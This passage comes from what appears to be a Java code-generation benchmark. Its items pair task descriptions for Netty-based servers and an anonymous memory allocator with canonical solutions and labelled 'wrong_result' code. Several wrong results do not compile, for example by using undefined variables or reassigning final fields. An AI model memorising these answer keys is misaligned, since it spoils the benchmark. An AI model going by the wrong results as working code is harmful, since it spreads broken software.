    "Canonical_solution": "import com.weibo.api.motan.common.ChannelState;\nimport com.weibo.api.motan.common.MotanConstants;\nimport com.weibo.api.motan.common.URLParamType;\nimport com.weibo.api.motan.core.DefaultThreadFactory;\nimport com.weibo.api.motan.core.StandardThreadExecutor;\nimport com.weibo.api.motan.exception.MotanFrameworkException;\nimport com.weibo.api.motan.rpc.Request;\nimport com.weibo.api.motan.rpc.Response;\nimport com.weibo.api.motan.rpc.URL;\nimport com.weibo.api.motan.transport.AbstractServer;\nimport com.weibo.api.motan.transport.MessageHandler;\nimport com.weibo.api.motan.transport.TransportException;\nimport com.weibo.api.motan.util.LoggerUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class NettyServer extends AbstractServer {\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel serverChannel;\n    private MessageHandler messageHandler;\n    private StandardThreadExecutor standardThreadExecutor;\n    private AtomicInteger rejectCounter = new AtomicInteger(0);\n    private NettyServerChannelManage channelManage;\n\n    public NettyServer(URL url, MessageHandler messageHandler) {\n        super(url);\n        this.messageHandler = messageHandler;\n    }\n\n    @Override\n    public boolean open() {\n        if (isAvailable()) {\n            LoggerUtil.warn(\"NettyServer ServerChannel already Open: url=\" + url);\n            return state.isAliveState();\n        }\n        if (bossGroup == null) {\n            bossGroup = new NioEventLoopGroup(1);\n            workerGroup = new NioEventLoopGroup();\n        }\n\n        LoggerUtil.info(\"NettyServer ServerChannel start Open: url=\" + url);\n        boolean shareChannel = url.getBooleanParameter(URLParamType.shareChannel.getName(), URLParamType.shareChannel.getBooleanValue());\n        final int maxContentLength = url.getIntParameter(URLParamType.maxContentLength.getName(), URLParamType.maxContentLength.getIntValue());\n        int maxServerConnection = url.getIntParameter(URLParamType.maxServerConnection.getName(), URLParamType.maxServerConnection.getIntValue());\n        int workerQueueSize = url.getIntParameter(URLParamType.workerQueueSize.getName(), URLParamType.workerQueueSize.getIntValue());\n\n        int minWorkerThread = shareChannel ? \n            url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MIN_WORKDER) :\n            url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MIN_WORKDER);\n        int maxWorkerThread = shareChannel ? \n            url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MAX_WORKDER) :\n            url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MAX_WORKDER);\n\n        standardThreadExecutor = new StandardThreadExecutor(minWorkerThread, maxWorkerThread, workerQueueSize, \n            new DefaultThreadFactory(\"NettyServer-\" + url.getServerPortStr(), true));\n        standardThreadExecutor.prestartAllCoreThreads();\n\n        channelManage = new NettyServerChannelManage(maxServerConnection);\n\n        ServerBootstrap serverBootstrap = new ServerBootstrap();\n        serverBootstrap.group(bossGroup, workerGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addLast(\"channel_manage\", channelManage);\n                    pipeline.addLast(\"decoder\", new NettyDecoder(codec, NettyServer.this, maxContentLength));\n                    pipeline.addLast(\"encoder\", new NettyEncoder());\n                    pipeline.addLast(\"handler\", new NettyChannelHandler(NettyServer.this, messageHandler, standardThreadExecutor));\n                }\n            });\n        serverBootstrap.childOption(ChannelOption.TCP_NODELAY, true);\n        serverBootstrap.childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture channelFuture = serverBootstrap.bind(new InetSocketAddress(url.getPort()));\n        channelFuture.syncUninterruptibly();\n        serverChannel = channelFuture.channel();\n        setLocalAddress((InetSocketAddress) serverChannel.localAddress());\n        if (url.getPort() == 0) {\n            url.setPort(getLocalAddress().getPort());\n        }\n\n        state = ChannelState.ALIVE;\n        LoggerUtil.info(\"NettyServer ServerChannel finish Open: url=\" + url);\n        return state.isAliveState();\n    }\n\n    @Override\n    public synchronized void close() {\n        if (state.isCloseState()) {\n            return;\n        }\n\n        try {\n            if (serverChannel != null) {\n                serverChannel.close();\n            }\n            if (bossGroup != null) {\n                bossGroup.shutdownGracefully();\n                bossGroup = null;\n            }\n            if (workerGroup != null) {\n                workerGroup.shutdownGracefully();\n                workerGroup = null;\n            }\n            if (channelManage != null) {\n                channelManage.close();\n            }\n            if (standardThreadExecutor != null) {\n                standardThreadExecutor.shutdownNow();\n            }\n\n            state = ChannelState.CLOSE;\n            LoggerUtil.info(\"NettyServer close Success: url={}\", url.getUri());\n        } catch (Exception e) {\n            LoggerUtil.error(\"NettyServer close Error: url=\" + url.getUri(), e);\n        }\n    }\n\n    @Override\n    public boolean isBound() {\n        return serverChannel != null && serverChannel.isActive();\n    }\n\n    @Override\n    public Response request(Request request) throws TransportException {\n        throw new MotanFrameworkException(\"NettyServer request(Request request) method not support: url: \" + url);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyServer extends AbstractServer {\n    private final NioEventLoopGroup bossGroup;\n    private final NioEventLoopGroup workerGroup;\n    private Channel serverChannel;\n    private MessageHandler messageHandler;\n    private StandardThreadExecutor standardThreadExecutor;\n    private AtomicInteger rejectCounter;\n    private NettyServerChannelManage channelManage;\n\n    public NettyServer(URL url, MessageHandler messageHandler) {\n        this.messageHandler = messageHandler;\n        this.rejectCounter = new AtomicInteger(0);\n        this.channelManage = new NettyServerChannelManage();\n        int bossThreads = Integer.parseInt(url.getParameter(\"bossThreads\", \"1\"));\n        int workerThreads = Integer.parseInt(url.getParameter(\"workerThreads\", \"4\"));\n        int executorThreads = Integer.parseInt(url.getParameter(\"executorThreads\", \"8\"));\n        this.bossGroup = new NioEventLoopGroup(bossThreads);\n        this.workerGroup = new NioEventLoopGroup(workerThreads);\n        this.standardThreadExecutor = new StandardThreadExecutor(executorThreads);\n    }\n\n    @Override\n    public boolean open() {\n        int port = url.getPort();\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             public void initChannel(SocketChannel ch) throws Exception {\n                 ChannelPipeline p = ch.pipeline();\n                 p.addLast(new MessageHandlerAdapter(messageHandler, standardThreadExecutor));\n             }\n         })\n         .option(ChannelOption.SO_BACKLOG, 1024)\n         .childOption(ChannelOption.SO_KEEPALIVE, true);\n        ChannelFuture f = b.bind(port).syncUninterruptibly();\n        if (f.isSuccess()) {\n            serverChannel = f.channel();\n            channelManage.init(serverChannel);\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    @Override\n    public void close() {\n        if (serverChannel != null) {\n            serverChannel.close().syncUninterruptibly();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n        standardThreadExecutor.shutdown();\n        setState(CLOSE);\n    }\n\n    @Override\n    public boolean isBound() {\n        return serverChannel != null && serverChannel.isActive();\n    }\n\n    @Override\n    public Response request(Request request) throws MotanFrameworkException {\n        throw new MotanFrameworkException(\"Server doesn't support direct requests\");\n    }\n\n    private class MessageHandlerAdapter extends ChannelInboundHandlerAdapter {\n        private final MessageHandler handler;\n        private final ExecutorService executor;\n\n        public MessageHandlerAdapter(MessageHandler handler, ExecutorService executor) {\n            this.handler = handler;\n            this.executor = executor;\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            executor.execute(() -> {\n                try {\n                    handler.handle(msg);\n                } catch (Exception e) {\n                    rejectCounter.incrementAndGet();\n                }\n            });\n        }\n    }\n}"
  },
  {
    "Task_id": 21,
    "Instruction": "Task Description: Implement a class that provides anonymous memory allocation capabilities using memory-mapped files, with a fallback to direct byte buffers if memory-mapped files cannot be unlinked.\n\nClass Description: The `AnonAllocator` class is designed to allocate anonymous memory blocks that are not backed by visible files in the filesystem. It attempts to use memory-mapped files that are immediately unlinked (deleted) from the filesystem while remaining accessible through the mapping. If this technique is not supported by the system, it falls back to using direct byte buffers.\n\nAttributes:\n- MAP_AND_UNLINK_SUPPORTED: boolean - A static final flag indicating whether the system supports memory mapping with immediate file unlinking. This is determined during class initialization by testing the capability.\n\nMethods:\n- allocate(int size) -> ByteBuffer - Allocates an anonymous memory block of the specified size. If memory-mapped files with unlinking are supported, it creates a temporary file, maps it into memory, and immediately deletes the file. Otherwise, it falls back to a direct byte buffer allocation. The method returns the allocated ByteBuffer.\n  - Input: size (int) - The size of the memory block to allocate in bytes.\n  - Output: ByteBuffer - The allocated memory block, either as a memory-mapped buffer or a direct byte buffer.",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileChannel.MapMode;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class AnonAllocator {\n\n    static final boolean MAP_AND_UNLINK_SUPPORTED;\n\n    static {\n        Path p = null;\n        boolean result = false;\n        try {\n            ByteBuffer mapped;\n            p = Files.createTempFile(\"unlink-test\", \".tmp\");\n            FileChannel chan = FileChannel.open(p, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            chan.write(ByteBuffer.allocate(4*1024));\n            mapped = chan.map(MapMode.READ_WRITE, 0, 4*1024);\n            chan.close();\n            Files.delete(p);\n            result = mapped.get() == 0;\n        } catch (IOException e) {\n            if(p != null) {\n                Path toDelete = p;\n                Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n                    try {\n                        Files.deleteIfExists(toDelete);\n                    } catch (IOException e1) {\n                        System.err.println(\"could not delete tempfile \"  + toDelete + \", most likely cause: garbage collector did not free the memory mapping keeping it open ; \" + e1.getMessage());\n                    }\n                }));\n            }\n        }\n        MAP_AND_UNLINK_SUPPORTED = result;\n    }\n\n    public static ByteBuffer allocate(int size) {\n        if(MAP_AND_UNLINK_SUPPORTED) {\n            try {\n                Path p = Files.createTempFile(\"anon-mapping\", \".tmp\");\n                ByteBuffer mapped;\n                FileChannel chan = FileChannel.open(p, StandardOpenOption.READ, StandardOpenOption.WRITE);\n                chan.position(size);\n                chan.write(ByteBuffer.allocate(1));\n                mapped = chan.map(MapMode.READ_WRITE, 0, size);\n                chan.close();\n                Files.delete(p);\n                return mapped;\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        return ByteBuffer.allocateDirect(size);\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileChannel.MapMode;\nimport java.nio.file.StandardOpenOption;\n\npublic class AnonAllocator {\n    public static final boolean MAP_AND_UNLINK_SUPPORTED;\n\n    static {\n        boolean supported = false;\n        File tempFile = null;\n        try {\n            tempFile = File.createTempFile(\"anon\", \".tmp\");\n            try (FileChannel channel = FileChannel.open(tempFile.toPath(), StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE)) {\n                MappedByteBuffer buffer = channel.map(MapMode.READ_WRITE, 0, 1);\n                if (tempFile.delete()) {\n                    supported = true;\n                } else {\n                    supported = false;\n                }\n            }\n        } catch (Exception e) {\n            supported = false;\n        } finally {\n            if (tempFile != null && tempFile.exists()) {\n                tempFile.delete();\n            }\n        }\n        MAP_AND_UNLINK_SUPPORTED = supported;\n    }\n\n    public ByteBuffer allocate(int size) {\n        if (MAP_AND_UNLINK_SUPPORTED) {\n            File tempFile = null;\n            try {\n                tempFile = File.createTempFile(\"anon\", \".tmp\");\n                try (FileChannel channel = FileChannel.open(tempFile.toPath(), StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE)) {\n                    MappedByteBuffer buffer = channel.map(MapMode.READ_WRITE, 0, size);\n                    if (tempFile.delete()) {\n                        return buffer;\n                    } else {\n                        return ByteBuffer.allocateDirect(size);\n                    }\n                }\n            } catch (Exception e) {\n                return ByteBuffer.allocateDirect(size);\n            } finally {\n                if (tempFile != null && tempFile.exists()) {\n                    tempFile.delete();\n                }\n            }\n        } else {\n            return ByteBuffer.allocateDirect(size);\n        }\n    }\n}"
  },
  {
    "Task_id": 210,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests. The server should be configurable to listen on a specified port and properly manage its resources.\n\nClass Description: HttpServer is a Netty-based TCP server implementation that handles HTTP requests. It manages server lifecycle including startup, shutdown, and resource cleanup. The server uses a boss-worker thread model for handling connections and requests efficiently.\n\nAttributes:\n- DEFAULT_PORT: int - The default port (8080) to use when no port is specified\n- bossGroup: EventLoopGroup - The parent thread group that accepts incoming connections\n- workerGroup: EventLoopGroup - The child thread group that handles the traffic of accepted connections\n- bootstrap: ServerBootstrap - The server configuration and startup helper class\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port. Initializes thread groups, configures server options, and binds to the port. Throws Exception if startup fails.\n- stop() -> void - Shuts down the server gracefully by releasing all thread resources\n- main(String[] args) -> void - Entry point that parses command line arguments for port number and starts the server",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class HttpServer {\n\n    public static int DEFAULT_PORT = 8080;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public void start(int port) throws Exception {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n\n        try {\n            bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new HttpServerChannelInitializer())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"HttpServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n        try {\n            port = Integer.parseInt(args[0]);\n        } catch (RuntimeException ex) {\n            port = DEFAULT_PORT;\n        }\n\n        HttpServer server = new HttpServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class HttpServer {\n    public static final int DEFAULT_PORT = 8080;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public HttpServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws Exception {\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 100)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(\n                                new HttpServerCodec(),\n                                new HttpObjectAggregator(65536),\n                                new SimpleHttpHandler()\n                        );\n                    }\n                });\n\n        ChannelFuture future = bootstrap.bind(port).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    public void stop() {\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = DEFAULT_PORT;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        HttpServer server = new HttpServer();\n        server.start(port);\n    }\n\n    private static class SimpleHttpHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof FullHttpRequest) {\n                FullHttpRequest request = (FullHttpRequest) msg;\n                String response = \"HTTP/1.1 200 OK\\r\\nContent-Length: 13\\r\\n\\r\\nHello, World!\";\n                ByteBuf buf = Unpooled.copiedBuffer(response, CharsetUtil.UTF_8);\n                ctx.writeAndFlush(new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, buf));\n            }\n            ReferenceCountUtil.release(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 211,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling HTTP requests with configurable thread pools and graceful shutdown capabilities.\n\nClass Description: NettySourceHttpServer is a TCP server implementation using Netty framework that handles HTTP requests. It manages server lifecycle (initialization, startup, shutdown) and uses configurable thread pools for handling connections. The server can be initialized with specific query registry and event subject for request processing.\n\nAttributes:\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations and other tasks for accepted connections\n- bossGroup: [NioEventLoopGroup] - Accepts incoming connections with configurable thread count\n- nettyServerRunnable: [Runnable] - Contains the server startup logic\n- isInitialized: [boolean] - Tracks whether the server has been initialized\n- isStarted: [boolean] - Tracks whether the server is running\n\nMethods:\n- [Constructor]([Context context, int threadCount]) -> [void] - Initializes bossGroup with specified thread count and workerGroup with default settings\n- init([QueryRegistry queryRegistry, Subject<String, String> eventSubject, int port]) -> [void] - Configures server bootstrap with HTTP handlers and binding port if not already initialized\n- startServer() -> [void] - Starts the server in a separate thread if initialized but not running, adds shutdown hook\n- shutdownServer() -> [void] - Gracefully shuts down server resources if initialized and running",
    "Canonical_solution": "import io.mantisrx.connector.publish.core.QueryRegistry;\nimport io.mantisrx.runtime.Context;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport rx.subjects.Subject;\n\npublic class NettySourceHttpServer implements SourceHttpServer {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(NettySourceHttpServer.class);\n\n    private final NioEventLoopGroup workerGroup;\n    private final NioEventLoopGroup bossGroup;\n\n    private Runnable nettyServerRunnable;\n    private volatile boolean isInitialized = false;\n    private volatile boolean isStarted = false;\n\n    public NettySourceHttpServer(Context context, int threadCount) {\n        this.bossGroup = new NioEventLoopGroup(threadCount);\n        this.workerGroup = new NioEventLoopGroup();\n    }\n\n    @Override\n    public void init(QueryRegistry queryRegistry, Subject<String, String> eventSubject, int port) {\n        if (!isInitialized) {\n            nettyServerRunnable = () -> {\n                try {\n                    ServerBootstrap b = new ServerBootstrap();\n                    b.option(ChannelOption.SO_BACKLOG, 1024);\n                    b.group(bossGroup, workerGroup)\n                            .channel(NioServerSocketChannel.class)\n                            .childHandler(new HttpServerInitializer(queryRegistry, eventSubject));\n                    Channel ch = b.bind(port).sync().channel();\n                    ch.closeFuture().sync();\n                } catch (Exception e) {\n                    LOGGER.error(e.getMessage());\n                } finally {\n                    bossGroup.shutdownGracefully();\n                    workerGroup.shutdownGracefully();\n                }\n            };\n\n            isInitialized = true;\n        }\n    }\n\n    @Override\n    public void startServer() {\n        if (isInitialized && !isStarted) {\n            ExecutorService executor = Executors.newSingleThreadExecutor();\n            executor.submit(nettyServerRunnable);\n\n            Runtime.getRuntime().addShutdownHook(new Thread(this::shutdownServer));\n\n            isStarted = true;\n        } else {\n            throw new IllegalStateException(\"Server already started\");\n        }\n    }\n\n    @Override\n    public void shutdownServer() {\n        if (isInitialized && isStarted) {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettySourceHttpServer {\n    private final NioEventLoopGroup bossGroup;\n    private final NioEventLoopGroup workerGroup;\n    private final Runnable nettyServerRunnable;\n    private boolean isInitialized = false;\n    private boolean isStarted = false;\n\n    public NettySourceHttpServer(Context context, int threadCount) {\n        this.bossGroup = new NioEventLoopGroup(threadCount);\n        this.workerGroup = new NioEventLoopGroup();\n        this.nettyServerRunnable = () -> {\n            ChannelFuture future = b.bind(port).sync();\n            future.addListener(future1 -> {\n                if (future1.isSuccess()) {\n                    System.out.println(\"Server started on port \" + port);\n                    isInitialized = true;\n                } else {\n                    System.err.println(\"Failed to start server\");\n                    future1.cause().printStackTrace();\n                }\n            });\n        };\n    }\n\n    public void init(QueryRegistry queryRegistry, Subject<String, String> eventSubject, int port) {\n        if (isInitialized) {\n            return;\n        }\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             public void initChannel(SocketChannel ch) {\n                 ch.pipeline().addLast(new HttpServerCodec());\n                 ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                 ch.pipeline().addLast(new HttpServerHandler(queryRegistry, eventSubject));\n             }\n         })\n         .option(ChannelOption.SO_BACKLOG, 128)\n         .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        this.nettyServerRunnable = () -> {\n            ChannelFuture future = b.bind(port).sync();\n            future.addListener(future1 -> {\n                if (future1.isSuccess()) {\n                    System.out.println(\"Server started on port \" + port);\n                    isInitialized = true;\n                } else {\n                    System.err.println(\"Failed to start server\");\n                    future1.cause().printStackTrace();\n                }\n            });\n        };\n        isInitialized = true;\n    }\n\n    public void startServer() {\n        if (isInitialized && !isStarted) {\n            Thread serverThread = new Thread(nettyServerRunnable);\n            serverThread.start();\n            isStarted = true;\n            Runtime.getRuntime().addShutdownHook(new Thread(this::shutdownServer));\n        }\n    }\n\n    public void shutdownServer() {\n        if (isInitialized && isStarted) {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n            isStarted = false;\n        }\n    }\n\n    private static class HttpServerHandler extends ChannelInboundHandlerAdapter {\n        private final QueryRegistry queryRegistry;\n        private final Subject<String, String> eventSubject;\n\n        HttpServerHandler(QueryRegistry queryRegistry, Subject<String, String> eventSubject) {\n            this.queryRegistry = queryRegistry;\n            this.eventSubject = eventSubject;\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof FullHttpRequest) {\n                FullHttpRequest request = (FullHttpRequest) msg;\n                String path = request.uri();\n                // Process the request using queryRegistry and eventSubject\n                // Example: queryRegistry.getHandler(path).handle(request);\n                // Publish event via eventSubject\n            }\n            ctx.fireChannelRead(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 212,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process requests.\n\nClass Description: The TimeServer class is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses Netty's event-driven architecture to efficiently handle multiple concurrent connections with non-blocking I/O operations.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nConstructor: TimeServer(int port) -> void - Initializes the server with the specified port number\nrun: run() -> void - Starts the server, configures Netty components, and begins listening for connections\nmain: main(String[] args) -> void - Entry point that creates and starts the server instance, using port 8080 by default or a specified port from command line arguments",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class TimeServer {\n\n    private int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new TimeServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        } else {\n            port = 8080;\n        }\n        new TimeServer(port).run();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class TimeServer {\n    private final int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new TimeServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 1024)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) {\n        int port = 8080;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        new TimeServer(port).run();\n    }\n\n    private static class TimeServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            String currentTime = new java.util.Date().toString();\n            ByteBuf buf = ctx.alloc().buffer();\n            buf.writeBytes(currentTime.getBytes());\n            ctx.writeAndFlush(buf);\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 213,
    "Instruction": "Task Description: Implement a Netty-based TCP server for handling remote commands with connection management and idle state detection.\n\nClass Description: NettyRemotingServer is a TCP server implementation using Netty framework that handles incoming remote commands, manages client connections, and provides event notification for connection changes. It supports configurable thread pools, connection idle detection, and custom channel event handling.\n\nAttributes:\n- serverBootstrap: ServerBootstrap - Netty server bootstrap instance for server configuration\n- bossSelectorGroup: EventLoopGroup - Netty event loop group for accepting connections\n- workerSelectorGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- defaultEventExecutorGroup: DefaultEventExecutorGroup - Thread pool for business logic processing\n- appContext: AppContext - Application context for dependency injection\n- LOGGER: Logger - Logger instance for server operations logging\n\nMethods:\n- NettyRemotingServer(AppContext, RemotingServerConfig) -> void - Constructor with application context and server configuration\n- NettyRemotingServer(RemotingServerConfig, ChannelEventListener) -> void - Constructor with server configuration and channel event listener\n- serverStart() -> void - Starts the Netty server, initializes thread pools and configures server bootstrap\n- serverShutdown() -> void - Shuts down the server gracefully, releasing all resources\n- NettyServerHandler: channelRead0(ChannelHandlerContext, RemotingCommand) -> void - Handles incoming message processing\n- NettyConnectManageHandler: channelRegistered(ChannelHandlerContext) -> void - Logs channel registration events\n- NettyConnectManageHandler: channelUnregistered(ChannelHandlerContext) -> void - Logs channel unregistration events\n- NettyConnectManageHandler: channelActive(ChannelHandlerContext) -> void - Handles new active connections\n- NettyConnectManageHandler: channelInactive(ChannelHandlerContext) -> void - Handles connection close events\n- NettyConnectManageHandler: userEventTriggered(ChannelHandlerContext, Object) -> void - Handles idle state events\n- NettyConnectManageHandler: exceptionCaught(ChannelHandlerContext, Throwable) -> void - Handles channel exceptions",
